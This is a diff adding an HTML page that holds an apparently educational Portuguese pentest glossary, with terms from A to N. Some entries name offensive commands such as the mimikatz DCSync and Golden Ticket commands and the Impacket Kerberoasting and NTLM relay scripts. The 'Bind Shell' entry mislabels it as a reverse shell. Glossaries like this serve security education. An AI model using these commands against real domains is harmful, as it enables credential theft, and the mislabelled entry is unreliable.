@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Glossário Cyber // Pentest Edition</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Share+Tech+Mono&display=swap');
+
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1218;
+    --bg3: #141820;
+    --border: #1e2530;
+    --green: #00ff88;
+    --green-dim: #00cc6a;
+    --green-dark: #003322;
+    --cyan: #00d4ff;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --purple: #9c88ff;
+    --text: #c8d3e0;
+    --text-dim: #5a6a7a;
+    --text-bright: #e8f0f8;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,136,0.015) 2px,
+      rgba(0,255,136,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 100;
+  }
+
+  /* Header */
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding: 24px 32px;
+    background: var(--bg2);
+    position: sticky;
+    top: 0;
+    z-index: 50;
+  }
+
+  .header-top {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 16px;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo-icon {
+    width: 36px;
+    height: 36px;
+    border: 2px solid var(--green);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: var(--green);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 8px var(--green); }
+    50% { box-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,255,136,0.3); }
+  }
+
+  .logo-text {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .logo-main {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 18px;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .logo-sub {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  .stats {
+    display: flex;
+    gap: 24px;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .stat-item { display: flex; flex-direction: column; align-items: flex-end; }
+  .stat-num { font-size: 18px; color: var(--cyan); font-weight: 600; }
+
+  /* Search */
+  .search-bar {
+    display: flex;
+    align-items: center;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 10px 16px;
+    gap: 10px;
+    transition: border-color 0.2s;
+  }
+
+  .search-bar:focus-within {
+    border-color: var(--green);
+    box-shadow: 0 0 12px rgba(0,255,136,0.15);
+  }
+
+  .search-prompt {
+    color: var(--green);
+    font-size: 14px;
+    white-space: nowrap;
+  }
+
+  .search-input {
+    background: none;
+    border: none;
+    outline: none;
+    color: var(--text-bright);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    flex: 1;
+    caret-color: var(--green);
+  }
+
+  .search-input::placeholder { color: var(--text-dim); }
+
+  .search-count {
+    font-size: 11px;
+    color: var(--text-dim);
+    white-space: nowrap;
+  }
+
+  /* Filter tabs */
+  .filters {
+    display: flex;
+    gap: 4px;
+    padding: 16px 32px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+
+  .filter-btn {
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 6px 14px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    transition: all 0.15s;
+  }
+
+  .filter-btn:hover {
+    border-color: var(--green-dim);
+    color: var(--green-dim);
+  }
+
+  .filter-btn.active {
+    background: var(--green-dark);
+    border-color: var(--green);
+    color: var(--green);
+  }
+
+  /* Main content */
+  .main {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    min-height: calc(100vh - 160px);
+  }
+
+  /* Sidebar index */
+  .sidebar {
+    border-right: 1px solid var(--border);
+    padding: 16px 0;
+    position: sticky;
+    top: 120px;
+    height: calc(100vh - 120px);
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+
+  .sidebar-title {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    padding: 0 16px 12px;
+    text-transform: uppercase;
+  }
+
+  .letter-group { margin-bottom: 4px; }
+
+  .letter-link {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 6px 16px;
+    font-size: 13px;
+    color: var(--text-dim);
+    text-decoration: none;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .letter-link:hover, .letter-link.active {
+    color: var(--green);
+    background: rgba(0,255,136,0.05);
+    padding-left: 20px;
+  }
+
+  .letter-link .count {
+    font-size: 10px;
+    color: var(--text-dim);
+  }
+
+  /* Content area */
+  .content {
+    padding: 24px 40px;
+    overflow-y: auto;
+  }
+
+  /* Letter section */
+  .letter-section { margin-bottom: 32px; }
+
+  .letter-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .letter-char {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 32px;
+    color: var(--green);
+    line-height: 1;
+    text-shadow: 0 0 20px rgba(0,255,136,0.5);
+  }
+
+  .letter-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  /* Term card */
+  .term-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid transparent;
+    margin-bottom: 8px;
+    transition: all 0.2s;
+    cursor: pointer;
+  }
+
+  .term-card:hover {
+    border-left-color: var(--green);
+    background: var(--bg3);
+    transform: translateX(2px);
+  }
+
+  .term-card.expanded {
+    border-left-color: var(--cyan);
+    border-color: rgba(0,212,255,0.3);
+  }
+
+  .term-header {
+    display: flex;
+    align-items: center;
+    padding: 12px 16px;
+    gap: 12px;
+  }
+
+  .term-name {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 15px;
+    color: var(--text-bright);
+    flex: 1;
+    letter-spacing: 1px;
+  }
+
+  .term-name mark {
+    background: rgba(0,255,136,0.25);
+    color: var(--green);
+    padding: 0 2px;
+  }
+
+  .term-tag {
+    font-size: 9px;
+    padding: 3px 8px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    border: 1px solid;
+  }
+
+  .tag-pentest { color: var(--red); border-color: rgba(255,71,87,0.4); background: rgba(255,71,87,0.08); }
+  .tag-network { color: var(--cyan); border-color: rgba(0,212,255,0.4); background: rgba(0,212,255,0.08); }
+  .tag-crypto { color: var(--purple); border-color: rgba(156,136,255,0.4); background: rgba(156,136,255,0.08); }
+  .tag-malware { color: var(--red); border-color: rgba(255,71,87,0.4); background: rgba(255,71,87,0.08); }
+  .tag-social { color: var(--yellow); border-color: rgba(255,211,42,0.4); background: rgba(255,211,42,0.08); }
+  .tag-defense { color: var(--green); border-color: rgba(0,255,136,0.4); background: rgba(0,255,136,0.08); }
+  .tag-web { color: #ff9f43; border-color: rgba(255,159,67,0.4); background: rgba(255,159,67,0.08); }
+  .tag-forensics { color: #a29bfe; border-color: rgba(162,155,254,0.4); background: rgba(162,155,254,0.08); }
+
+  .term-toggle {
+    color: var(--text-dim);
+    font-size: 12px;
+    transition: transform 0.2s;
+    width: 16px;
+    text-align: center;
+  }
+
+  .term-card.expanded .term-toggle {
+    transform: rotate(90deg);
+    color: var(--cyan);
+  }
+
+  .term-body {
+    display: none;
+    padding: 0 16px 14px 16px;
+    border-top: 1px solid var(--border);
+    margin-top: 0;
+  }
+
+  .term-card.expanded .term-body { display: block; }
+
+  .term-def {
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.7;
+    padding-top: 12px;
+  }
+
+  .term-def .highlight { color: var(--green-dim); }
+  .term-def .cmd {
+    font-family: 'Share Tech Mono', monospace;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    font-size: 12px;
+    color: var(--cyan);
+  }
+
+  /* Empty state */
+  .empty-state {
+    text-align: center;
+    padding: 80px 20px;
+    color: var(--text-dim);
+  }
+
+  .empty-state .code { font-size: 48px; color: var(--border); margin-bottom: 16px; }
+  .empty-state p { font-size: 13px; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+  /* Animations */
+  .term-card { animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateX(-8px); } to { opacity: 1; transform: translateX(0); } }
+
+  .hidden { display: none !important; }
+
+  @media (max-width: 768px) {
+    .main { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+    .content { padding: 16px; }
+    .header { padding: 16px; }
+    .filters { padding: 12px 16px; }
+    .stats { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-top">
+    <div class="logo">
+      <div class="logo-icon">⬡</div>
+      <div class="logo-text">
+        <span class="logo-main">CyberGlossary</span>
+        <span class="logo-sub">Pentest Edition // v1.0</span>
+      </div>
+    </div>
+    <div class="stats">
+      <div class="stat-item">
+        <span class="stat-num" id="total-count">0</span>
+        <span>termos</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-num" id="visible-count">0</span>
+        <span>visíveis</span>
+      </div>
+    </div>
+  </div>
+  <div class="search-bar">
+    <span class="search-prompt">root@cyber:~$</span>
+    <input type="text" class="search-input" id="searchInput" placeholder="grep -i 'termo' glossario.db" autocomplete="off" spellcheck="false">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+</div>
+
+<div class="filters" id="filterBar">
+  <button class="filter-btn active" data-filter="all">Todos</button>
+  <button class="filter-btn" data-filter="pentest">Pentest</button>
+  <button class="filter-btn" data-filter="network">Redes</button>
+  <button class="filter-btn" data-filter="web">Web</button>
+  <button class="filter-btn" data-filter="malware">Malware</button>
+  <button class="filter-btn" data-filter="crypto">Criptografia</button>
+  <button class="filter-btn" data-filter="social">Engenharia Social</button>
+  <button class="filter-btn" data-filter="defense">Defesa</button>
+  <button class="filter-btn" data-filter="forensics">Forense</button>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sidebar-title">// Índice</div>
+    <div id="letterIndex"></div>
+  </div>
+  <div class="content" id="glossaryContent"></div>
+</div>
+
+<script>
+const terms = [
+  // A
+  { term: "Active Directory (AD)", tag: "network", def: "Serviço de diretório da Microsoft usado para gerenciar identidades e recursos em redes corporativas. É um alvo primário em pentests internos — comprometer o AD significa comprometer o domínio inteiro. Ataques comuns incluem <span class='highlight'>Pass-the-Hash</span>, Kerberoasting e DCSync." },
+  { term: "Active Reconnaissance", tag: "pentest", def: "Fase de reconhecimento em que o atacante interage diretamente com o alvo (varreduras de porta, fingerprinting de serviços). Gera logs e pode ser detectada, ao contrário da <span class='highlight'>passive recon</span>. Ferramentas comuns: <span class='cmd'>nmap</span>, <span class='cmd'>nikto</span>, <span class='cmd'>masscan</span>." },
+  { term: "Adversary-in-the-Middle (AiTM)", tag: "pentest", def: "Evolução do MITM (Man-in-the-Middle) onde o atacante se posiciona entre a vítima e o recurso legítimo, interceptando e potencialmente modificando o tráfego. Em contextos modernos, inclui bypass de MFA via proxying de sessões autenticadas." },
+  { term: "ARP Poisoning", tag: "network", def: "Técnica de envenenamento da tabela ARP em redes locais, associando o MAC do atacante ao IP de outro host. Permite interceptação de tráfego (MITM) em redes Ethernet. Ferramenta clássica: <span class='cmd'>arpspoof</span> e <span class='cmd'>Ettercap</span>." },
+  { term: "Attack Surface", tag: "pentest", def: "Conjunto total de pontos de entrada onde um atacante pode tentar explorar um sistema — portas abertas, endpoints de API, formulários web, serviços expostos, usuários. Reduzir a superfície de ataque é um princípio fundamental de hardening." },
+  { term: "Attack Vector", tag: "pentest", def: "Caminho ou método pelo qual um atacante consegue acesso ao sistema. Classificado em <span class='highlight'>Network (N)</span>, <span class='highlight'>Adjacent (A)</span>, <span class='highlight'>Local (L)</span> e <span class='highlight'>Physical (P)</span> no framework CVSS." },
+  { term: "Authentication Bypass", tag: "pentest", def: "Técnica para contornar mecanismos de autenticação sem credenciais válidas. Pode ocorrer via falhas lógicas na aplicação, tokens previsíveis, manipulação de cookies ou exploração de CVEs em sistemas de login." },
+
+  // B
+  { term: "Backdoor", tag: "malware", def: "Mecanismo oculto instalado em um sistema comprometido para manter acesso persistente sem o conhecimento do proprietário. Pode ser implementado via trojan, rootkit ou modificação direta de binários do sistema." },
+  { term: "Banner Grabbing", tag: "pentest", def: "Técnica de coleta de informações sobre serviços em execução através dos banners de resposta (ex: cabeçalhos HTTP, prompts SSH). Revela versões de software que podem ser cruzadas com bancos de CVEs. Realizado com <span class='cmd'>netcat</span>, <span class='cmd'>curl</span> ou <span class='cmd'>nmap -sV</span>." },
+  { term: "Bind Shell", tag: "pentest", def: "Shell reverso em que o atacante se conecta à máquina vítima. O host comprometido fica 'escutando' em uma porta específica aguardando conexão. Contrasta com o <span class='highlight'>Reverse Shell</span>, onde a vítima inicia a conexão." },
+  { term: "BloodHound", tag: "pentest", def: "Ferramenta de análise de caminhos de ataque em ambientes Active Directory. Usa teoria dos grafos para identificar rotas de privilege escalation e movimentação lateral. Coleta dados via <span class='cmd'>SharpHound</span> ou <span class='cmd'>BloodHound.py</span>." },
+  { term: "Blue Team", tag: "defense", def: "Equipe responsável pela defesa, monitoramento e resposta a incidentes de segurança. Opera com ferramentas como SIEM, EDR e IDS. Trabalha em contraste ao Red Team (ataque) e ao Purple Team (colaboração)." },
+  { term: "Brute Force", tag: "pentest", def: "Ataque de força bruta que tenta todas as combinações possíveis de credenciais ou chaves até encontrar a correta. Pode ser otimizado com wordlists (dictionary attack) ou regras de mutação. Ferramentas: <span class='cmd'>Hydra</span>, <span class='cmd'>Hashcat</span>, <span class='cmd'>John the Ripper</span>." },
+  { term: "Buffer Overflow", tag: "pentest", def: "Vulnerabilidade clássica onde dados além da capacidade do buffer sobrescrevem regiões de memória adjacentes, potencialmente controlando o fluxo de execução. Exploits podem sobrescrever o return address para executar shellcode arbitrário. Base das técnicas de <span class='highlight'>exploit development</span>." },
+  { term: "Bug Bounty", tag: "pentest", def: "Programa onde organizações recompensam pesquisadores de segurança que reportam vulnerabilidades de forma responsável. Plataformas populares incluem <span class='highlight'>HackerOne</span>, <span class='highlight'>Bugcrowd</span> e <span class='highlight'>Intigriti</span>." },
+
+  // C
+  { term: "C2 (Command and Control)", tag: "malware", def: "Infraestrutura usada por atacantes para comunicar-se com sistemas comprometidos (implants/agents). Permite execução remota de comandos, exfiltração de dados e pivoting. Frameworks populares: <span class='cmd'>Cobalt Strike</span>, <span class='cmd'>Metasploit</span>, <span class='cmd'>Sliver</span>, <span class='cmd'>Havoc</span>." },
+  { term: "CAPTCHA Bypass", tag: "web", def: "Técnica para contornar mecanismos CAPTCHA usando resolvedores de terceiros (serviços humanos ou ML), exploração de falhas lógicas na implementação, ou reutilização de tokens válidos previamente capturados." },
+  { term: "Chain of Custody", tag: "forensics", def: "Documentação cronológica que registra quem coletou, manipulou e armazenou evidências digitais em uma investigação forense. Essencial para garantir a admissibilidade legal das provas." },
+  { term: "Clickjacking", tag: "web", def: "Técnica onde uma página maliciosa sobrepõe frames invisíveis de um site legítimo, induzindo o usuário a clicar em elementos sem perceber. Mitigado com cabeçalho HTTP <span class='cmd'>X-Frame-Options</span> ou <span class='cmd'>Content-Security-Policy: frame-ancestors</span>." },
+  { term: "CSRF (Cross-Site Request Forgery)", tag: "web", def: "Ataque que força um usuário autenticado a executar ações não intencionais em uma aplicação web. O atacante cria uma requisição maliciosa que o browser da vítima envia automaticamente com suas credenciais de sessão. Mitigado com tokens anti-CSRF e cookies SameSite." },
+  { term: "CVE (Common Vulnerabilities and Exposures)", tag: "defense", def: "Sistema de identificação padronizado para vulnerabilidades de segurança publicadas. Cada CVE tem um identificador único (ex: <span class='highlight'>CVE-2021-44228</span> = Log4Shell). Mantido pelo MITRE Corporation e utilizado globalmente." },
+  { term: "CVSS (Common Vulnerability Scoring System)", tag: "defense", def: "Sistema de pontuação numérica (0-10) que avalia a severidade de vulnerabilidades com base em métricas de ataque (vetor, complexidade, privilégios requeridos, impacto em CIA). Versão atual: <span class='highlight'>CVSS 3.1</span>." },
+  { term: "Credential Stuffing", tag: "pentest", def: "Uso automatizado de pares usuário/senha vazados em um serviço para tentar autenticar em outros serviços, explorando a reutilização de senhas. Diferente do brute force — usa credenciais reais, não geradas." },
+  { term: "Cryptojacking", tag: "malware", def: "Uso não autorizado dos recursos computacionais da vítima para minerar criptomoedas. Pode ocorrer via scripts no navegador (JavaScript) ou malware instalado no sistema. Detectável por spike anormal de CPU/GPU." },
+
+  // D
+  { term: "Data Exfiltration", tag: "pentest", def: "Transferência não autorizada de dados sensíveis de um sistema comprometido para um destino controlado pelo atacante. Pode ocorrer via DNS tunneling, HTTP/S, ICMP ou canais covert. Fase final do Kill Chain." },
+  { term: "DCSync", tag: "pentest", def: "Técnica de ataque que simula o comportamento de um Domain Controller para solicitar hashes de senhas via protocolo MS-DRSR. Requer privilégios de replicação de domínio (ou DA/Enterprise Admin). Executado com <span class='cmd'>mimikatz lsadump::dcsync</span>." },
+  { term: "Decompiler", tag: "forensics", def: "Ferramenta que converte código binário compilado de volta para código de alto nível legível. Essencial em análise de malware e engenharia reversa. Exemplos: <span class='cmd'>Ghidra</span>, <span class='cmd'>IDA Pro</span>, <span class='cmd'>Cutter</span>." },
+  { term: "Defense in Depth", tag: "defense", def: "Estratégia de segurança que implementa múltiplas camadas de controles sobrepostos. Se uma camada falha, outras continuam protegendo o ativo. Princípio fundamental da arquitetura de segurança corporativa." },
+  { term: "DKIM (DomainKeys Identified Mail)", tag: "defense", def: "Mecanismo de autenticação de e-mail que usa assinatura criptográfica para verificar que o conteúdo não foi alterado e que foi enviado pelo domínio declarado. Parte da tríade anti-spoofing junto com SPF e DMARC." },
+  { term: "DNS Enumeration", tag: "pentest", def: "Processo de coleta de registros DNS de um domínio-alvo (A, MX, NS, TXT, CNAME, SPF) para mapear a infraestrutura. Ferramentas: <span class='cmd'>dig</span>, <span class='cmd'>dnsrecon</span>, <span class='cmd'>fierce</span>, <span class='cmd'>subfinder</span>." },
+  { term: "DNS Tunneling", tag: "pentest", def: "Técnica de exfiltração de dados ou estabelecimento de C2 encapsulando informações em consultas/respostas DNS. Explora o fato de que DNS raramente é bloqueado por firewalls. Ferramenta de referência: <span class='cmd'>iodine</span>, <span class='cmd'>dnscat2</span>." },
+  { term: "DoS / DDoS", tag: "network", def: "<span class='highlight'>Denial of Service</span> / <span class='highlight'>Distributed DoS</span>: Ataques que visam tornar um serviço indisponível sobrecarregando recursos. DDoS usa múltiplos hosts (botnets) para amplificar o ataque. Tipos: volumétrico, protocolo (SYN flood) e camada de aplicação." },
+  { term: "Domain Fronting", tag: "pentest", def: "Técnica de evasão que usa CDNs (como Cloudflare ou AWS) para mascarar o destino real do tráfego C2. O host header interno aponta para o servidor do atacante enquanto o SNI/TLS mostra um domínio legítimo." },
+  { term: "DREAD", tag: "defense", def: "Framework de avaliação de risco de vulnerabilidades com cinco métricas: <span class='highlight'>D</span>amage, <span class='highlight'>R</span>eproducibility, <span class='highlight'>E</span>xploitability, <span class='highlight'>A</span>ffected Users, <span class='highlight'>D</span>iscoverability. Alternativa ou complemento ao CVSS." },
+  { term: "Dropper", tag: "malware", def: "Tipo de malware cujo único objetivo é baixar e executar outro payload malicioso no sistema comprometido. Frequentemente usado como primeiro estágio de infecção para instalar RATs, ransomware ou backdoors." },
+
+  // E
+  { term: "EDR (Endpoint Detection and Response)", tag: "defense", def: "Solução de segurança instalada em endpoints que monitora comportamento em tempo real, detecta ameaças e permite resposta automatizada ou manual. Evolução do antivírus tradicional. Produtos: CrowdStrike Falcon, Carbon Black, SentinelOne." },
+  { term: "Empire Framework", tag: "pentest", def: "Framework de pós-exploração baseado em PowerShell e Python (atualmente fork mantido como <span class='highlight'>BC-Security Empire</span>). Oferece agentes, módulos de escalada de privilégios, movimentação lateral e evasão de AV." },
+  { term: "Enumeration", tag: "pentest", def: "Fase do pentest que extrai informações detalhadas sobre alvos identificados: usuários, shares, serviços, versões, configurações. É mais intrusiva que reconnaissance e precede a exploração." },
+  { term: "Exploit", tag: "pentest", def: "Código ou sequência de comandos que aproveita uma vulnerabilidade específica para causar comportamento inesperado em um sistema — execução de código, escalonamento de privilégios ou negação de serviço." },
+  { term: "Exploit Development", tag: "pentest", def: "Processo de criar exploits funcionais para vulnerabilidades, especialmente memory corruption (buffer overflow, use-after-free, heap spray). Envolve análise de binários, manipulação de memória e técnicas de bypass (ASLR, DEP/NX, Stack Canaries)." },
+
+  // F
+  { term: "False Positive / False Negative", tag: "defense", def: "<span class='highlight'>False Positive</span>: alerta de segurança para uma ameaça que não existe. <span class='highlight'>False Negative</span>: falha em detectar uma ameaça real. O equilíbrio entre ambos é crítico na calibração de SIEMs e sistemas de detecção." },
+  { term: "File Inclusion (LFI/RFI)", tag: "web", def: "<span class='highlight'>Local File Inclusion</span> e <span class='highlight'>Remote File Inclusion</span>: vulnerabilidades web que permitem incluir arquivos arbitrários no processamento da aplicação. LFI pode expor <span class='cmd'>/etc/passwd</span> e logs; RFI permite execução remota de código." },
+  { term: "Fileless Malware", tag: "malware", def: "Malware que opera inteiramente em memória RAM, sem gravar arquivos em disco. Usa processos legítimos do sistema (PowerShell, WMI, LOLBins) para executar código malicioso, dificultando detecção por antivírus tradicionais." },
+  { term: "Firewall", tag: "defense", def: "Dispositivo de segurança (hardware ou software) que filtra tráfego de rede com base em regras predefinidas. Evoluiu de packet filtering para Next-Generation Firewall (NGFW) com inspeção profunda de pacotes (DPI) e consciência de aplicação." },
+  { term: "Forensic Imaging", tag: "forensics", def: "Processo de criação de uma cópia exata (bit-a-bit) de mídias de armazenamento para análise forense. Preserva metadados, espaço não alocado e arquivos deletados. Ferramenta padrão: <span class='cmd'>dd</span>, <span class='cmd'>FTK Imager</span>." },
+  { term: "Fuzzing", tag: "pentest", def: "Técnica de teste de segurança que envia entradas aleatórias, malformadas ou inesperadas a uma aplicação para provocar crashes ou comportamentos anômalos que revelam vulnerabilidades. Ferramentas: <span class='cmd'>AFL++</span>, <span class='cmd'>libFuzzer</span>, <span class='cmd'>Boofuzz</span>." },
+
+  // G
+  { term: "Golden Ticket", tag: "pentest", def: "Ataque avançado em Active Directory que cria tickets Kerberos TGT forjados usando o hash NTLM da conta <span class='highlight'>krbtgt</span>. Permite acesso persistente e praticamente irrestrito ao domínio. Executado com <span class='cmd'>mimikatz kerberos::golden</span>." },
+  { term: "GPO Abuse", tag: "pentest", def: "Exploração de Group Policy Objects mal configurados em Active Directory para executar código em múltiplos sistemas do domínio. Uma GPO comprometida com permissões de escrita pode ser usada para criar tarefas agendadas maliciosas em todos os hosts do escopo." },
+  { term: "Gray Box Testing", tag: "pentest", def: "Modalidade de pentest onde o testador possui conhecimento parcial do sistema-alvo (ex: documentação de APIs, credenciais de usuário comum). Equilibra realismo (black box) e eficiência (white box)." },
+
+  // H
+  { term: "Hash Cracking", tag: "pentest", def: "Processo de recuperar senhas originais a partir de seus hashes usando técnicas como dictionary attack, brute force, rainbow tables ou rule-based attacks. Ferramentas: <span class='cmd'>Hashcat</span> (GPU) e <span class='cmd'>John the Ripper</span> (CPU)." },
+  { term: "Heap Spray", tag: "pentest", def: "Técnica de exploit que aloca grandes quantidades de shellcode/NOP sleds no heap para aumentar a probabilidade de que um ponteiro corrompido aponte para o payload. Usada em exploits de browsers e plugins." },
+  { term: "Honey Pot", tag: "defense", def: "Sistema decoy deliberadamente vulnerável e monitorado, projetado para atrair atacantes e coletar inteligência sobre TTPs (Táticas, Técnicas e Procedimentos). Variantes: honeypot, honeynet, honeytoken." },
+  { term: "HTTP Request Smuggling", tag: "web", def: "Vulnerabilidade que explora ambiguidades na interpretação de requisições HTTP por diferentes componentes (frontend/backend), permitindo contrabandear requisições maliciosas. Pode levar a bypass de controles de segurança, hijacking de sessão e cache poisoning." },
+  { term: "HTTPS Downgrade Attack", tag: "network", def: "Ataque que força uma conexão HTTPS a usar HTTP não cifrado ou protocolos TLS mais fracos (SSLstrip, BEAST, POODLE). Permite interceptação de tráfego supostamente seguro. Mitigado com HSTS (HTTP Strict Transport Security)." },
+
+  // I
+  { term: "IDOR (Insecure Direct Object Reference)", tag: "web", def: "Vulnerabilidade de controle de acesso onde a aplicação expõe referências diretas a objetos internos (IDs de usuário, nomes de arquivo) sem verificar autorização. Permite acesso a dados de outros usuários simplesmente modificando parâmetros na requisição." },
+  { term: "Indicators of Compromise (IoC)", tag: "defense", def: "Artefatos ou evidências observáveis que indicam comprometimento de um sistema: hashes de malware, IPs maliciosos, domínios C2, chaves de registro, artefatos em disco. Base da threat intelligence e resposta a incidentes." },
+  { term: "Injection (SQL, Command, LDAP)", tag: "web", def: "Família de vulnerabilidades onde input não sanitizado é interpretado como código pelo backend. <span class='highlight'>SQL Injection</span> manipula queries de banco; <span class='highlight'>Command Injection</span> executa comandos do sistema; <span class='highlight'>LDAP Injection</span> compromete diretórios. Consistentemente no OWASP Top 10." },
+  { term: "Intrusion Detection System (IDS)", tag: "defense", def: "Sistema que monitora tráfego de rede ou atividade do sistema em busca de padrões de ataque conhecidos. <span class='highlight'>NIDS</span> (network-based) e <span class='highlight'>HIDS</span> (host-based). Apenas detecta; o <span class='highlight'>IPS</span> (Prevention) também bloqueia." },
+
+  // K
+  { term: "Kerberoasting", tag: "pentest", def: "Técnica de ataque ao protocolo Kerberos em AD onde qualquer usuário autenticado pode solicitar tickets de serviço (TGS) para contas com SPNs e tentar craqueá-los offline para obter senhas de service accounts. Ferramenta: <span class='cmd'>GetUserSPNs.py</span> do Impacket." },
+  { term: "Keylogger", tag: "malware", def: "Software ou hardware que registra secretamente todas as teclas pressionadas pelo usuário. Captura senhas, mensagens e dados sensíveis. Pode operar em nível de kernel (mais stealth) ou userland." },
+  { term: "Kill Chain (Cyber)", tag: "pentest", def: "Modelo da Lockheed Martin que descreve as 7 fases de um ataque cibernético: <span class='highlight'>Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives</span>. Base conceitual do threat modeling ofensivo." },
+
+  // L
+  { term: "Lateral Movement", tag: "pentest", def: "Técnicas usadas após comprometimento inicial para mover-se horizontalmente pela rede e comprometer outros sistemas. Incluem Pass-the-Hash, Pass-the-Ticket, RDP hijacking, uso de <span class='cmd'>psexec</span>, <span class='cmd'>wmiexec</span> e <span class='cmd'>smbexec</span>." },
+  { term: "LOLBAS / LOLBins", tag: "pentest", def: "<span class='highlight'>Living Off the Land Binaries, Scripts and Libraries</span>: uso de binários e scripts legítimos do sistema operacional para fins maliciosos (execução de código, bypass de AV, exfiltração). Exemplos: <span class='cmd'>certutil.exe</span>, <span class='cmd'>mshta.exe</span>, <span class='cmd'>regsvr32.exe</span>." },
+
+  // M
+  { term: "Malware Analysis", tag: "malware", def: "Estudo de software malicioso para entender seu comportamento, origem e impacto. Divide-se em <span class='highlight'>estática</span> (análise de código sem execução, com Ghidra/IDA) e <span class='highlight'>dinâmica</span> (execução em sandbox, com Cuckoo/ANY.RUN)." },
+  { term: "Metasploit Framework", tag: "pentest", def: "Plataforma de desenvolvimento e execução de exploits mais utilizada em pentests. Oferece módulos de exploitation, payloads (Meterpreter), encoders e auxiliares de scan. Mantido pela Rapid7. Uso via <span class='cmd'>msfconsole</span>." },
+  { term: "MITRE ATT&CK", tag: "defense", def: "Framework de conhecimento que cataloga TTPs (Táticas, Técnicas e Procedimentos) de adversários reais com base em observações do mundo real. Usado para threat modeling, detecção e threat hunting. Disponível em <span class='highlight'>attack.mitre.org</span>." },
+  { term: "MITM (Man-in-the-Middle)", tag: "network", def: "Ataque onde o adversário se posiciona entre dois hosts comunicantes, interceptando e potencialmente alterando o tráfego sem conhecimento das partes. Habilitado por ARP poisoning, rogue AP, BGP hijacking ou DNS spoofing." },
+  { term: "MFA Fatigue Attack", tag: "social", def: "Ataque de engenharia social que envia dezenas de notificações push de MFA para a vítima até que ela, por exaustão ou confusão, aprove acidentalmente. Também chamado de <span class='highlight'>MFA Bombing</span>. Usado em ataques reais contra Uber e Cisco." },
+
+  // N
+  { term: "Network Segmentation", tag: "defense", def: "Prática de dividir uma rede em zonas isoladas (segmentos) para limitar o movimento lateral de atacantes e conter brechas. Implementada via VLANs, firewalls internos e micro-segmentação (zero trust)." },
+  { term: "Nmap", tag: "pentest", def: "Scanner de rede open-source, ferramenta mais utilizada em pentests para descoberta de hosts e serviços. Suporta detecção de SO (<span class='cmd'>-O</span>), versão de serviço (<span class='cmd'>-sV</span>), scripts NSE (<span class='cmd'>-sC</span>) e evasão de firewall." },
+  { term: "NTLM Relay", tag: "pentest", def: "Ataque que captura hashes de autenticação NTLM e os retransmite para outro serviço sem precisar quebrá-los. Permite autenticar em servidores na rede como a vítima. Ferramenta: <span class='cmd'>ntlmrelayx.py</span> do Impacket." },
+
+  // O
